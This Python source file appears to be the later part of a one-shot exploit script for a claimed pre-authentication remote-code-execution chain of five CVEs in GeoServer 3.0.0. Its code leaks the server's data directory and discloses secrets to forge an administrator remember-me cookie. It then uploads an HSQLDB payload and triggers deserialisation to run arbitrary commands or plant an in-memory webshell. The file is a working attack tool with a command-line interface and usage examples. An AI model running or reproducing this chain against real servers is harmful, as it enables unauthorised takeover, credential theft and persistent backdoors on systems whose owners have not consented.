def upload(http, target, path, body, content_type="application/octet-stream"):
    require("upload " + path, http.put(resource_url(target, path), data=body,
                                       headers={"Content-Type": content_type}))


def register_service(http, target, database_url):
    if http.get(service_url(target, SERVICE)).status_code == 200:
        http.delete(service_url(target, SERVICE))
    require("JDBC service creation", http.post(service_url(target), data=jdbc_configuration(database_url),
                                               headers={"Content-Type": "application/xml"}))


def trigger(http, target):
    url = (target + "/rest/security/usergroup/service/"
           + urllib.parse.quote(SERVICE, safe="") + "/user/PWN/groups")
    try:
        code = http.get(url).status_code
    except requests.RequestException:
        code = "timeout"
    # The payload runs inside this request, so 500 (property lookup fails after
    # deserialisation) is the normal outcome.
    return code


def poll(http, target, path, seconds):
    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline:
        r = http.get(resource_url(target, path))
        if r.status_code == 200:
            return r.content
        if r.status_code != 404:
            raise RuntimeError("reading %s returned HTTP %s" % (path, r.status_code))
        time.sleep(0.5)
    return None


def parse_result(body, token, command_b64):
    try:
        lines = body.decode("ascii").splitlines()
        fields = dict(line.split("=", 1) for line in lines)
        if len(fields) != len(lines):
            raise ValueError()
    except (ValueError, UnicodeDecodeError):
        raise RuntimeError("the payload result was malformed")
    if fields.get("token") != token or fields.get("command_b64") != command_b64:
        raise RuntimeError("the payload result belongs to another run")
    return (int(fields["exit_code"]), fields.get("timed_out") == "true",
            fields.get("output_truncated") == "true", base64.b64decode(fields["output_b64"]))


def cleanup(http, target, stage, token, query_id):
    if query_id:
        location = resource_url(target, "wfs/query/%s.xml" % query_id)
        try:
            if http.head(location).status_code == 200:
                http.delete(location)
        except requests.RequestException:
            pass
    try:
        if http.get(service_url(target, SERVICE)).status_code == 200:
            http.delete(service_url(target, SERVICE))
    except requests.RequestException:
        pass
    try:
        if http.head(resource_url(target, stage)).status_code == 200:
            http.delete(resource_url(target, stage))
            good("removed staging directory %s and temporary service" % stage)
    except requests.RequestException:
        pass


def run(args):
    target = args.url.rstrip("/")
    http = Http(args.timeout)
    http.verify = not args.insecure
    http.headers["User-Agent"] = "gs-preauth-rce-1shot"
    if args.insecure:
        requests.packages.urllib3.disable_warnings(
            requests.packages.urllib3.exceptions.InsecureRequestWarning)

    data_directory = args.data_dir
    if not data_directory:
        info("leaking the data-directory path (CVE-2026-129244)")
        data_directory = discover_data_directory(http, target)
    good("data directory: %s" % data_directory)

    info("creating an anonymous stored query with deferred XInclude "
         "(CVE-2026-129243 + CVE-2026-120705)")
    query_id = "gssec" + secrets.token_hex(12)
    key, verifier = disclose_secrets(http, target, data_directory, query_id)
    good("remember-me key=%r, admin digest=%s..." % (key, verifier[:20]))
    anonymous_drop(http, target, query_id)

    info("forging a remember-me cookie (CVE-2026-129245)")
    admin_session(http, target, verifier, key)
    good("administrator session established")

    token = secrets.token_hex(16)
    if args.memshell:
        stage = "gsx-" + token
        props, script = SHELL_PROPS, SHELL_SCRIPT
        extra = []
        result_path = "memshell-status.txt"
    else:
        stage = "gs-rce-" + token
        props, script = RCE_PROPS, RCE_SCRIPT
        command_b64 = base64.b64encode(args.command.encode("ascii")).decode()
        extra = [(stage + "/request.txt", (token + "\n" + command_b64 + "\n").encode(), "text/plain")]
        result_path = stage + "/result.txt"

    database = stage + "/payload"
    database_url = "jdbc:hsqldb:file:%s/%s;shutdown=true" % (data_directory.rstrip("/"), database)

    if http.head(resource_url(target, stage)).status_code != 404:
        raise RuntimeError("refusing to overwrite the existing %s" % stage)

    info("uploading the HSQLDB payload via the REST resource API")
    upload(http, target, database + ".properties", props)
    upload(http, target, database + ".script", script)
    for path, body, content_type in extra:
        upload(http, target, path, body, content_type)

    info("registering JDBC user-group service %r" % SERVICE)
    register_service(http, target, database_url)
    good("service registered (CVE-2026-129242 sink armed)")

    info("triggering deserialisation")
    good("trigger response: %s" % trigger(http, target))

    body = poll(http, target, result_path, args.wait)
    if body is None:
        raise RuntimeError("the payload published nothing within %ss" % args.wait)

    if args.memshell:
        good("in-memory webshell installed")
        sys.stdout.write(body.decode("utf-8", "replace"))
        host = urllib.parse.urlsplit(target).netloc.rsplit(":", 1)[0]
        sys.stdout.write("\nshell: http://%s:8080/gsx/?cmd=id\n" % host)
    else:
        exit_code, timed_out, truncated, output = parse_result(body, token, command_b64)
        if timed_out:
            bad("the command timed out")
        if truncated:
            bad("output truncated at 1 MiB")
        good("command executed (exit %s)" % exit_code)
        sys.stdout.buffer.write(output)
        if output and not output.endswith(b"\n"):
            sys.stdout.buffer.write(b"\n")
        sys.stdout.buffer.flush()

    if not args.keep:
        info("cleaning up")
        cleanup(http, target, stage, token, query_id)
    return 0


def main():
    parser = argparse.ArgumentParser(
        description="GeoServer 3.0.0 pre-auth RCE (5-CVE chain), one shot",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  %(prog)s -u http://127.0.0.1:8080/geoserver -c id\n"
               "  %(prog)s -u http://127.0.0.1:8080/geoserver --memshell\n")
    parser.add_argument("-u", "--url", required=True, help="GeoServer application URL, e.g. http://host:8080/geoserver")
    parser.add_argument("-c", "--command", default="id", help="command to run (Linux, <=512 printable ASCII bytes)")
    parser.add_argument("--memshell", action="store_true", help="install the /gsx in-memory webshell instead of running a command")
    parser.add_argument("--data-dir", default=None, help="known data directory; skips CVE-2026-129244")
    parser.add_argument("--wait", type=float, default=45, help="seconds to wait for the payload (default 45)")
    parser.add_argument("--timeout", type=float, default=30, help="HTTP timeout in seconds (default 30)")
    parser.add_argument("-k", "--insecure", action="store_true", help="disable TLS verification")
    parser.add_argument("--keep", action="store_true", help="keep the staging directory and JDBC service")
    args = parser.parse_args()

    if not args.memshell:
        try:
            args.command.encode("ascii")
        except UnicodeEncodeError:
            parser.error("--command must be printable ASCII")
        if not 0 < len(args.command.encode("ascii")) <= 512:
            parser.error("--command must be 1..512 bytes")
        if any(byte < 0x20 or byte > 0x7E for byte in args.command.encode("ascii")):
            parser.error("--command must be printable ASCII")

    parsed = urllib.parse.urlsplit(args.url)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        parser.error("--url must be an HTTP(S) GeoServer URL")
    if parsed.username or parsed.password:
        parser.error("--url must not contain credentials")

    try:
        return run(args)
    except (RuntimeError, OSError, requests.RequestException) as error:
        bad(str(error))
        return 1


if __name__ == "__main__":
    sys.exit(main())
